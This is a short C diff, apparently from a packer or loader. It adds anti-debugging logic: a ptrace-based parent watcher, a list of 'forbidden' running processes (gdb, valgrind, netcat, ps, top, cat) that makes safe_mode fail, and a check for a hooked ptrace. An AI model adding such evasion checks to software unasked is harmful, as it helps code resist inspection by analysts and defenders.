@@ -35,9 +35,10 @@ void fork_watcher() {
                     ptrace(PTRACE_CONT, ppid, NULL, NULL);
                     kill(ppid, SIGINT);
                     _exit(0);
-
+                    break;
                 } else {
                     _exit(0);
+                    break;
                 }
             }
         }
@@ -59,6 +60,10 @@ BOOL				safe_mode(t_aes *aes)
     }
 	fork_watcher();
 
+    char *forbiddens[] = { "cat", "top", "htop", "gdb", "netcat", "ps", "valgrind", 0};
+    if (processes_exists((char**)&forbiddens[0])) {
+        return FALSE;
+    }
 	if ((handle = dlopen (0, RTLD_NOW | RTLD_GLOBAL)) != NULL) {
 		void *func = dlsym(handle, "ptrace");
         void *c = &ptrace;
